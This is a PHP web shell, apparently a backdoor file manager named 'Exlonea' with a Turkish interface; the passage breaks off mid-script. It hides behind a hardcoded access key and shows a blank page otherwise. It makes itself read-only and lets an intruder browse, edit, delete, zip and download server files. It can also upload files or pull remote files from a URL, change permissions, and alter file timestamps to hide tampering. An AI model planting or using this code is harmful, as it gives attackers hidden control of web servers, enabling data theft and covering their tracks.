<?php
if (!function_exists('unlink')) {
    function unlink($filename, $context = null) {
        return false;
    }
}
@chmod(__FILE__, 0444);
if (!isset($_GET['key']) || $_GET['key'] !== 'exlonea') {
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"></head><body></body></html>';
    exit;
}
session_start();
function getFileList($dir) {
    $files = array();
    $dirs = array();
    if (!is_dir($dir)) {
        return array_merge($dirs, $files);
    }
    $items = @scandir($dir);
    if ($items === false) {
        return array_merge($dirs, $files);
    }
    foreach ($items as $item) {
        if ($item !== '.' && $item !== '..') {
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            $entry = array(
                'name' => $item,
                'path' => $path,
                'type' => is_dir($path) ? 'dir' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'mtime' => @filemtime($path),
                'perms' => @substr(sprintf('%o', fileperms($path)), -4),
                'icon' => is_dir($path) ? 'bi bi-folder-fill text-warning' : getFileIcon($item)
            );
            if (is_dir($path)) {
                $dirs[] = $entry;
            } else {
                $files[] = $entry;
            }
        }
    }
    return array_merge($dirs, $files);
}
function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = array(
        'jpg' => 'bi bi-image',
        'jpeg' => 'bi bi-image',
        'png' => 'bi bi-image',
        'gif' => 'bi bi-image',
        'php' => 'bi bi-file-code',
        'html' => 'bi bi-file-code',
        'css' => 'bi bi-file-code',
        'js' => 'bi bi-file-code',
        'pdf' => 'bi bi-file-pdf',
        'txt' => 'bi bi-file-text'
    );
    return isset($icons[$ext]) ? $icons[$ext] : 'bi bi-file';
}
function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $size = max($size, 0);
    $pow = floor(($size ? log($size) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $size /= pow(1024, $pow);
    return round($size, 2) . ' ' . $units[$pow];
}
function zipFolder($source, $destination, $direct = false) {
    if (!class_exists('ZipArchive')) {
        return array('success' => false, 'error' => 'ZipArchive eklentisi yüklü değil!');
    }
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return array('success' => false, 'error' => 'Zip dosyası oluşturulamadı!');
    }
    $source = str_replace('\\', '/', realpath($source));
    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = str_replace('\\', '/', $file);
            if (in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) {
                continue;
            }
            $file = realpath($file);
            if (is_dir($file)) {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            } elseif (is_file($file)) {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    } elseif (is_file($source)) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }
    $result = $zip->close();
    if ($direct && $result) {
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . basename($destination) . '"');
        header('Content-Length: ' . filesize($destination));
        readfile($destination);
        @unlink($destination);
        exit;
    }
    return array('success' => $result, 'error' => $result ? '' : 'Zipleme başarısız!');
}
function zipMultiple($files, $destination, $currentDir) {
    if (!class_exists('ZipArchive')) {
        return array('success' => false, 'error' => 'ZipArchive eklentisi yüklü değil!');
    }
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return array('success' => false, 'error' => 'Zip dosyası oluşturulamadı!');
    }
    foreach ($files as $file) {
        $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
        if ($filePath && strpos($filePath, realpath($currentDir)) === 0) {
            $filePath = str_replace('\\', '/', $filePath);
            if (is_dir($filePath)) {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filePath), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($iterator as $item) {
                    $item = str_replace('\\', '/', $item);
                    if (in_array(substr($item, strrpos($item, '/') + 1), array('.', '..'))) {
                        continue;
                    }
                    $item = realpath($item);
                    if (is_dir($item)) {
                        $zip->addEmptyDir(str_replace($currentDir . '/', '', $item . '/'));
                    } elseif (is_file($item)) {
                        $zip->addFromString(str_replace($currentDir . '/', '', $item), file_get_contents($item));
                    }
                }
            } elseif (is_file($filePath)) {
                $zip->addFromString($file, file_get_contents($filePath));
            }
        }
    }
    $result = $zip->close();
    return array('success' => $result, 'error' => $result ? '' : 'Toplu zipleme başarısız!');
}
function searchFiles($dir, $query) {
    $results = array();
    $files = getFileList($dir);
    foreach ($files as $file) {
        if (stripos($file['name'], $query) !== false) {
            $results[] = $file;
        }
        if ($file['type'] === 'dir') {
            $subResults = searchFiles($file['path'], $query);
            $results = array_merge($results, $subResults);
        }
    }
    return $results;
}
function getMimeType($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $mimes = array(
        'txt' => 'text/plain',
        'php' => 'text/plain',
        'html' => 'text/html',
        'css' => 'text/css',
        'js' => 'application/javascript',
        'jpg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif',
        'pdf' => 'application/pdf'
    );
    return isset($mimes[$ext]) ? $mimes[$ext] : 'application/octet-stream';
}
function getBreadcrumb($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $breadcrumb = array();
    $currentPath = '';
    foreach ($parts as $part) {
        if ($part) {
            $currentPath .= DIRECTORY_SEPARATOR . $part;
            $breadcrumb[] = array(
                'name' => $part,
                'path' => $currentPath
            );
        }
    }
    return $breadcrumb;
}
$action = isset($_GET['action']) ? $_GET['action'] : '';
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$currentDir = realpath($currentDir) ? realpath($currentDir) : getcwd();
$uploadDir = $currentDir . DIRECTORY_SEPARATOR . 'Uploads';
is_dir($uploadDir) || mkdir($uploadDir, 0777, true);
$error = '';
$success = '';
if ($action === 'delete' && isset($_POST['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    if ($file && strpos($file, realpath(getcwd())) === 0) {
        if (is_dir($file)) {
            @rmdir($file);
        } else {
            @unlink($file);
        }
        $success = 'Dosya silindi: ' . htmlspecialchars($_POST['file']);
    } else {
        $error = 'Dosya silme hatası: Geçersiz yol!';
    }
}
if ($action === 'rename' && isset($_POST['old_name'], $_POST['new_name'])) {
    $oldPath = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['old_name']);
    $newPath = realpath($currentDir) . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if ($oldPath && strpos($oldPath, realpath(getcwd())) === 0 && !file_exists($newPath)) {
        if (@rename($oldPath, $newPath)) {
            $success = 'Dosya adı değiştirildi: ' . htmlspecialchars($_POST['new_name']);
        } else {
            $error = 'Yeniden adlandırma başarısız!';
        }
    } else {
        $error = 'Yeniden adlandırma hatası: Geçersiz yol!';
    }
}
if ($action === 'move' && isset($_POST['file'], $_POST['destination'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $dest = realpath($_POST['destination'] . DIRECTORY_SEPARATOR . basename($file));
    if ($file && $dest && strpos($file, realpath(getcwd())) === 0 && strpos($dest, realpath(getcwd())) === 0) {
        if (@rename($file, $dest)) {
            $success = 'Dosya taşındı: ' . htmlspecialchars(basename($file));
        } else {
            $error = 'Taşıma başarısız!';
        }
    } else {
        $error = 'Taşıma hatası: Geçersiz yol!';
    }
}
if ($action === 'copy' && isset($_POST['file'], $_POST['destination'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $dest = realpath($_POST['destination'] . DIRECTORY_SEPARATOR . basename($file));
    if ($file && $dest && strpos($file, realpath(getcwd())) === 0 && strpos($dest, realpath(getcwd())) === 0) {
        if (@copy($file, $dest)) {
            $success = 'Dosya kopyalandı: ' . htmlspecialchars(basename($file));
        } else {
            $error = 'Kopyalama başarısız!';
        }
    } else {
        $error = 'Kopyalama hatası: Geçersiz yol!';
    }
}
if ($action === 'download' && isset($_POST['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    if ($file && is_file($file) && strpos($file, realpath(getcwd())) === 0) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        $error = 'İndirme hatası: Geçersiz dosya!';
    }
}
if ($action === 'zip' && isset($_POST['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    if ($file && strpos($file, realpath(getcwd())) === 0) {
        $zipName = basename($file) . '.zip';
        $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
        $result = zipFolder($file, $zipPath);
        if ($result['success']) {
            $success = 'Dosya ziplendi: ' . htmlspecialchars($zipName);
        } else {
            $error = $result['error'];
        }
    } else {
        $error = 'Zipleme hatası: Geçersiz yol!';
    }
}
if ($action === 'directzip' && isset($_POST['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    if ($file && strpos($file, realpath(getcwd())) === 0) {
        $zipName = basename($file) . '.zip';
        $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
        $result = zipFolder($file, $zipPath, true);
        if (!$result['success']) {
            $error = $result['error'];
        }
    } else {
        $error = 'DirektZiple hatası: Geçersiz yol!';
    }
}
if ($action === 'toplu_zip' && isset($_POST['files'])) {
    $files = $_POST['files'];
    if (empty($files)) {
        $error = 'Toplu zipleme hatası: Dosya seçilmedi!';
    } else {
        $zipName = 'toplu_' . time() . '.zip';
        $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
        $result = zipMultiple($files, $zipPath, $currentDir);
        if ($result['success']) {
            $success = 'Dosyalar ziplendi: ' . htmlspecialchars($zipName);
        } else {
            $error = $result['error'];
        }
    }
}
if ($action === 'edit' && isset($_POST['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    if ($file && is_file($file) && strpos($file, realpath(getcwd())) === 0) {
        if (isset($_POST['content'])) {
            if (file_put_contents($file, $_POST['content']) !== false) {
                $success = 'Dosya kaydedildi: ' . htmlspecialchars($_POST['file']);
            } else {
                $error = 'Dosya kaydetme hatası!';
            }
        } else {
            $content = @file_get_contents($file);
            if ($content === false) {
                $error = 'Dosya okuma hatası!';
            }
        }
    } else {
        $error = 'Dosya düzenleme hatası: Geçersiz dosya!';
    }
}
if ($action === 'chmod' && isset($_POST['file'], $_POST['permissions'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $perms = octdec($_POST['permissions']);
    if ($file && strpos($file, realpath(getcwd())) === 0) {
        if (@chmod($file, $perms)) {
            $success = 'İzinler değiştirildi: ' . htmlspecialchars($_POST['file']) . ' (' . sprintf('%o', $perms) . ')';
        } else {
            $error = 'İzin değiştirme hatası!';
        }
    } else {
        $error = 'İzin değiştirme hatası: Geçersiz yol!';
    }
}
if ($action === 'mtime' && isset($_POST['file'], $_POST['mtime'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $mtime = strtotime($_POST['mtime']);
    if ($file && strpos($file, realpath(getcwd())) === 0 && $mtime !== false) {
        if (@touch($file, $mtime)) {
            $success = 'Tarih değiştirildi: ' . htmlspecialchars($_POST['file']) . ' (' . date('Y-m-d H:i:s', $mtime) . ')';
        } else {
            $error = 'Tarih değiştirme hatası!';
        }
    } else {
        $error = 'Tarih değiştirme hatası: Geçersiz yol veya tarih!';
    }
}
if ($action === 'upload' && isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $file = $uploadDir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (!is_writable($uploadDir)) {
        $error = 'Hata: Uploads/ klasörü yazılabilir değil. İzinleri kontrol edin (chmod 0777).';
    } elseif ($_FILES['file']['size'] > 10485760) {
        $error = 'Hata: Dosya boyutu 10MB\'tan büyük.';
    } elseif (move_uploaded_file($_FILES['file']['tmp_name'], $file)) {
        $success = 'Dosya başarıyla yüklendi: <a href="?action=open&file=' . urlencode(basename($file)) . '&dir=' . urlencode($uploadDir) . '&key=exlonea" target="_blank">' . htmlspecialchars(basename($file)) . '</a>';
    } else {
        $error = 'Hata: Dosya yüklenemedi. Sunucu yapılandırmasını kontrol edin (error: ' . $_FILES['file']['error'] . ').';
    }
}
if ($action === 'url_upload' && isset($_POST['url'])) {
    $url = filter_var($_POST['url'], FILTER_VALIDATE_URL);
    if ($url) {
        $fileName = basename(parse_url($url, PHP_URL_PATH));
        $fileName = $fileName ?: 'downloaded_file_' . time();
        $file = $uploadDir . DIRECTORY_SEPARATOR . $fileName;
        if (!is_writable($uploadDir)) {
            $error = 'Hata: Uploads/ klasörü yazılabilir değil. İzinleri kontrol edin (chmod 0777).';
        } else {
            $content = @file_get_contents($url);
            if ($content !== false && file_put_contents($file, $content)) {
                $success = 'Dosya URL’den başarıyla yüklendi: <a href="?action=open&file=' . urlencode($fileName) . '&dir=' . urlencode($uploadDir) . '&key=exlonea" target="_blank">' . htmlspecialchars($fileName) . '</a>';
            } else {
                $error = 'Hata: URL’den dosya yüklenemedi. URL geçerli mi?';
            }
        }
    } else {
        $error = 'Hata: Geçersiz URL.';
    }
}
if ($action === 'open' && isset($_GET['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_GET['file']);
    if ($file && is_file($file) && strpos($file, realpath(getcwd())) === 0) {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif'])) {
            $content = '<img src="data:image/' . $ext . ';base64,' . base64_encode(file_get_contents($file)) . '" style="max-width: 100%;">';
        } elseif (in_array($ext, ['php', 'html', 'txt', 'css', 'js'])) {
            $content = '<textarea class="form-control" rows="20" readonly>' . htmlspecialchars(@file_get_contents($file)) . '</textarea>';
        } else {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    } else {
        $error = 'Dosya açma hatası: Geçersiz dosya!';
    }
}
if ($action === 'search' && isset($_GET['query'])) {
    $searchQuery = $_GET['query'];
    $files = searchFiles($currentDir, $searchQuery);
} else {
    $files = getFileList($currentDir);
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exlonea</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
    <style>
        body { background-color: #f8f9fa; }
        .table { font-size: 14px; }
        .modal-body input, .modal-body textarea { width: 100%; }
        .search-bar { max-width: none; }
        h2 { font-family: 'Cinzel Decorative', cursive; font-weight: 400; }
        .breadcrumb a { text-decoration: none; }
        .footer { color: #6c757d; text-align: center; margin-top: 20px; }
        .file-icon { margin-right: 5px; }
        .scrollable-table { max-height: 500px; overflow-y: auto; }
        .file-content img, .file-content textarea { max-width: 100%; }
        @media (max-width: 576px) {
            .table { font-size: 12px; }
            .container { padding: 10px; }
            .scrollable-table { max-height: 300px; }
        }
    </style>
</head>
<body>
    <div class="container mt-4">
        <h2><a href="?dir=<?php echo urlencode(getcwd()); ?>&key=exlonea" style="text-decoration: none; color: inherit;">eXlONeA</a></h2>
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php foreach (getBreadcrumb($currentDir) as $crumb) { ?>
                    <li class="breadcrumb-item"><a href="?dir=<?php echo urlencode($crumb['path']); ?>&key=exlonea"><?php echo htmlspecialchars($crumb['name']); ?></a></li>
                <?php } ?>
            </ol>
        </nav>
        <div class="mb-3">
            <div class="dropdown">
                <button class="btn btn-primary dropdown-toggle" type="button" id="actionsMenu" data-bs-toggle="dropdown" aria-expanded="false">İşlemler</button>
                <ul class="dropdown-menu" aria-labelledby="actionsMenu">
                    <li><a class="dropdown-item action-edit" href="#" onclick="performAction('edit')">Düzenle</a></li>
                    <li><a class="dropdown-item action-download" href="#" onclick="performAction('download')">İndir</a></li>
                    <li><a class="dropdown-item action-zip" href="#" onclick="performAction('zip')">Zip</a></li>
                    <li><a class="dropdown-item action-directzip" href="#" onclick="performAction('directzip')">DirektZiple</a></li>
                    <li><a class="dropdown-item action-toplu-zip" href="#" onclick="performTopluZip()">Toplu Zip</a></li>
                    <li><a class="dropdown-item action-rename" href="#" data-bs-toggle="modal" data-bs-target="#renameModal" onclick="setRenameFile()">Yeniden Adlandır</a></li>
                    <li><a class="dropdown-item action-move" href="#" data-bs-toggle="modal" data-bs-target="#moveModal" onclick="setMoveFile()">Taşı</a></li>
                    <li><a class="dropdown-item action-copy" href="#" data-bs-toggle="modal" data-bs-target="#copyModal" onclick="setCopyFile()">Kopyala</a></li>
                    <li><a class="dropdown-item action-delete" href="#" onclick="if (confirm('Silmek istediğinize emin misiniz?')) performAction('delete')">Sil</a></li>
                    <li><a class="dropdown-item action-chmod" href="#" data-bs-toggle="modal" data-bs-target="#chmodModal" onclick="setChmodFile()">İzinleri Düzenle</a></li>
                    <li><a class="dropdown-item action-mtime" href="#" data-bs-toggle="modal" data-bs-target="#mtimeModal" onclick="setMtimeFile()">Tarih Düzenle</a></li>
                </ul>
            </div>
        </div>
        <form method="GET" class="mb-3">
            <div class="input-group search-bar">
                <input type="text" class="form-control" id="searchInput" name="query" placeholder="Dosya ara..." value="<?php echo isset($searchQuery) ? htmlspecialchars($searchQuery) : ''; ?>">
                <input type="hidden" name="action" value="search">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
                <input type="hidden" name="key" value="exlonea">
                <button type="submit" class="btn btn-primary">Ara</button>
            </div>
        </form>
        <form method="POST" enctype="multipart/form-data" class="mb-3">
            <input type="hidden" name="action" value="upload">
            <div class="input-group mb-2">
                <input type="file" class="form-control" name="file">
                <button type="submit" class="btn btn-success">Yükle</button>
            </div>
        </form>
        <form method="POST" action="?action=url_upload&dir=<?php echo urlencode($currentDir); ?>&key=exlonea" class="mb-3">
            <div class="input-group">
                <input type="text" class="form-control" name="url" placeholder="URL’den dosya yükle (örn: https://siteadi.com/dosya.php)">
                <button type="submit" class="btn btn-success">URL’den Yükle</button>
            </div>
        </form>
        <?php if ($success) { ?>
            <div class="alert alert-success"><?php echo $success; ?></div>
        <?php } ?>
        <?php if ($error) { ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
        <?php } ?>
        <?php if ($action === 'edit' && isset($content)) { ?>
            <h3>Dosya Düzenle: <?php echo htmlspecialchars($_POST['file']); ?></h3>
            <form method="POST" action="?action=edit&dir=<?php echo urlencode($currentDir); ?>&key=exlonea">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($_POST['file']); ?>">
                <div class="mb-3">
                    <textarea class="form-control" name="content" rows="20"><?php echo htmlspecialchars($content); ?></textarea>
                </div>
                <button type="submit" class="btn btn-primary">Kaydet</button>
                <a href="?dir=<?php echo urlencode($currentDir); ?>&key=exlonea" class="btn btn-secondary">İptal</a>
            </form>
        <?php } elseif ($action === 'open' && isset($content)) { ?>
            <div class="scrollable-table">
                <h3>Dosya İçeriği: <?php echo htmlspecialchars($_GET['file']); ?></h3>
                <div class="file-content mb-3">
                    <?php echo $content; ?>
                </div>
                <div class="dropdown mb-3">
                    <button class="btn btn-primary dropdown-toggle" type="button" id="fileActionsMenu" data-bs-toggle="dropdown" aria-expanded="false">İşlemler</button>
                    <ul class="dropdown-menu" aria-labelledby="fileActionsMenu">
                        <li><a class="dropdown-item action-edit" href="#" onclick="performAction('edit')">Düzenle</a></li>
                        <li><a class="dropdown-item action-download" href="#" onclick="performAction('download')">İndir</a></li>
                        <li><a class="dropdown-item action-zip" href="#" onclick="performAction('zip')">Zip</a></li>
                        <li><a class="dropdown-item action-directzip" href="#" onclick="performAction('directzip')">DirektZiple</a></li>
                        <li><a class="dropdown-item action-rename" href="#" data-bs-toggle="modal" data-bs-target="#renameModal" onclick="setRenameFile()">Yeniden Adlandır</a></li>
                        <li><a class="dropdown-item action-move" href="#" data-bs-toggle="modal" data-bs-target="#moveModal" onclick="setMoveFile()">Taşı</a></li>
                        <li><a class="dropdown-item action-copy" href="#" data-bs-toggle="modal" data-bs-target="#copyModal" onclick="setCopyFile()">Kopyala</a></li>
                        <li><a class="dropdown-item action-delete" href="#" onclick="if (confirm('Silmek istediğinize emin misiniz?')) performAction('delete')">Sil</a></li>
                        <li><a class="dropdown-item action-chmod" href="#" data-bs-toggle="modal" data-bs-target="#chmodModal" onclick="setChmodFile()">İzinleri Düzenle</a></li>
                        <li><a class="dropdown-item action-mtime" href="#" data-bs-toggle="modal" data-bs-target="#mtimeModal" onclick="setMtimeFile()">Tarih Düzenle</a></li>
                    </ul>
                </div>
                <a href="?dir=<?php echo urlencode($currentDir); ?>&key=exlonea" class="btn btn-secondary">Geri</a>
            </div>
        <?php } else { ?>
            <form id="fileForm">
                <div class="scrollable-table">
                    <table class="table table-bordered table-responsive">
                        <thead>
                            <tr>
                                <th style="width: 5%;"><input type="checkbox" id="selectFile" onchange="toggleFileSelection()"></th>
                                <th>Ad</th>
                                <th>Tür</th>
                                <th>Boyut</th>
                                <th>Son Değiştirme</th>
                                <th>İzinler</th>
                            </tr>
                        </thead>
                        <tbody id="fileList">
                            <?php foreach ($files as $file) { ?>
                                <tr data-file-name="<?php echo htmlspecialchars($file['name']); ?>" data-file-type="<?php echo $file['type']; ?>">
                                    <td><input type="checkbox" name="file[]" value="<?php echo htmlspecialchars($file['name']); ?>" onchange="updateFileSelection()"></td>
                                    <td>
                                        <i class="<?php echo $file['icon']; ?> file-icon"></i>
                                        <?php if ($file['type'] === 'dir') { ?>
                                            <a href="?dir=<?php echo urlencode($file['path']); ?>&key=exlonea"><?php echo htmlspecialchars($file['name']); ?></a>
                                        <?php } else { ?>
                                            <a href="?action=open&file=<?php echo urlencode($file['name']); ?>&dir=<?php echo urlencode($currentDir); ?>&key=exlonea"><?php echo htmlspecialchars($file['name']); ?></a>
                                        <?php } ?>
                                    </td>
                                    <td><?php echo $file['type'] === 'dir' ? 'Dizin' : 'Dosya'; ?></td>
                                    <td><?php echo $file['type'] === 'file' ? formatSize($file['size']) : '-'; ?></td>
                                    <td><?php echo $file['mtime'] ? date('Y-m-d H:i:s', $file['mtime']) : '-'; ?></td>
                                    <td><?php echo $file['perms'] ?: '-'; ?></td>
                                </tr>
                            <?php } ?>
                        </tbody>
                    </table>
                </div>
            </form>
        <?php } ?>
        <div class="footer">Copyright © Exlonea - 2025</div>
    </div>
    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="renameModalLabel">Yeniden Adlandır</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                </div>
                <form method="POST" action="?action=rename&dir=<?php echo urlencode($currentDir); ?>&key=exlonea">
                    <div class="modal-body">
                        <input type="hidden" name="old_name" id="renameOldName">
                        <div class="mb-3">
                            <label for="new_name" class="form-label">Yeni Ad</label>
                            <input type="text" class="form-control" id="new_name" name="new_name" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Kapat</button>
                        <button type="submit" class="btn btn-primary">Kaydet</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade" id="moveModal" tabindex="-1" aria-labelledby="moveModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="moveModalLabel">Taşı</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                </div>
                <form method="POST" action="?action=move&dir=<?php echo urlencode($currentDir); ?>&key=exlonea">
                    <div class="modal-body">
                        <input type="hidden" name="file" id="moveFile">
                        <div class="mb-3">
                            <label for="destination" class="form-label">Hedef Dizin</label>
                            <input type="text" class="form-control" id="destination" name="destination" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Kapat</button>
                        <button type="submit" class="btn btn-primary">Taşı</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade" id="copyModal" tabindex="-1" aria-labelledby="copyModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="copyModalLabel">Kopyala</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                </div>
                <form method="POST" action="?action=copy&dir=<?php echo urlencode($currentDir); ?>&key=exlonea">
                    <div class="modal-body">
                        <input type="hidden" name="file" id="copyFile">
                        <div class="mb-3">
                            <label for="destination" class="form-label">Hedef Dizin</label>
                            <input type="text" class="form-control" id="destination" name="destination" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Kapat</button>
                        <button type="submit" class="btn btn-primary">Kopyala</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="chmodModalLabel">İzinleri Düzenle</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                </div>
                <form method="POST" action="?action=chmod&dir=<?php echo urlencode($currentDir); ?>&key=exlonea">
                    <div class="modal-body">
                        <input type="hidden" name="file" id="chmodFile">
                        <div class="mb-3">
                            <label for="permissions" class="form-label">İzinler (örn: 0777)</label>
                            <input type="text" class="form-control" id="permissions" name="permissions" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Kapat</button>
                        <button type="submit" class="btn btn-primary">Kaydet</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="modal fade" id="mtimeModal" tabindex="-1" aria-labelledby="mtimeModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="mtimeModalLabel">Tarih Düzenle</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                </div>
                <form method="POST" action="?action=mtime&dir=<?php echo urlencode($currentDir); ?>&key=exlonea">
                    <div class="modal-body">
                        <input type="hidden" name="file" id="mtimeFile">
                        <div class="mb-3">
                            <label for="mtime" class="form-label">Tarih ve Saat (örn: 2025-07-23 19:20:00)</label>
                            <input type="text" class="form-control" id="mtime" name="mtime" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Kapat</button>
                        <button type="submit" class="btn btn-primary">Kaydet</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let selectedFiles = [];
        let selectedFileType = '';
        function updateFileSelection() {
            selectedFiles = [];
            document.querySelectorAll('input[name="file[]"]:checked').forEach(cb => {
                selectedFiles.push(cb.value);
            });
            selectedFileType = selectedFiles.length === 1 ? document.querySelector(`input[name="file[]"][value="${selectedFiles[0]}"]`).closest('tr').getAttribute('data-file-type') : '';
            document.querySelector('.action-edit').style.display = selectedFiles.length === 1 && selectedFileType === 'file' ? 'block' : 'none';
            document.querySelector('.action-download').style.display = selectedFiles.length === 1 && selectedFileType === 'file' ? 'block' : 'none';
            document.querySelector('.action-zip').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-directzip').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-rename').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-move').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-copy').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-delete').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-chmod').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-mtime').style.display = selectedFiles.length === 1 ? 'block' : 'none';
            document.querySelector('.action-toplu-zip').style.display = selectedFiles.length > 0 ? 'block' : 'none';
        }
        function performAction(action) {
            if (selectedFiles.length !== 1) {
                alert('Lütfen bir dosya veya klasör seçin!');
                return;
            }
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = `?action=${action}&dir=<?php echo urlencode($currentDir); ?>&key=exlonea`;
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'file';
            input.value = selectedFiles[0];
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function performTopluZip() {
            if (selectedFiles.length === 0) {
                alert('Lütfen en az bir dosya veya klasör seçin!');
                return;
            }
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = `?action=toplu_zip&dir=<?php echo urlencode($currentDir); ?>&key=exlonea`;
            selectedFiles.forEach(file => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'files[]';
                input.value = file;
                form.appendChild(input);
